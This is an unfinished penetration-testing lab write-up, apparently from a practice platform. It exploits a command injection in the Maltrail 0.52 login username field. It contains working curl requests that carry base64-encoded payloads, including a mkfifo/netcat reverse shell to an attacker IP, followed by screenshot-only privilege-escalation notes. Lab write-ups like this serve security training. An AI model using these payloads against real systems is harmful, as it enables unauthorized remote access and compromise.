#InProgress 
```IP

```
# Enumeration

## HTTP 80
apache 2.4.52
## HTTP 8338
maltrail v 0.52
# Exploitation

we search for mailtrail vulnerabilities, and we find command injection in the username parameter 

```
echo 'ping -c 5 192.168.45.176' | base64
```
```
curl 'http://192.168.140.32:8338/login' --data 'username=;`echo+\"cGluZyAtYyA1IDE5Mi4xNjguNDUuMTc2Cg==\"+|+base64+-d+|+sh`'
```
we can successfully ping ourselves
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204103745.png?raw=true)
After some trial and error, I got a revshell the following mkfifo payload set on local port 80:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc  192.168.45.176 80 >/tmp/f
```

```
curl 'http://192.168.140.32:8338/login' --data 'username=;`echo+\"cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAgMTkyLjE2OC40NS4xNzYgODAgPi90bXAvZg==\"+|+base64+-d+|+sh`'
```

# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204110845.png?raw=true)

we find the following file

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204114500.png?raw=true)
with pspy64 we can see that it is running as root
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204114717.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204115148.png?raw=true)

we receive the revshell
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204115217.png?raw=true)


## Automated

### Peass
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204114628.png?raw=true)
### Mimikatz

# Lateral Movement
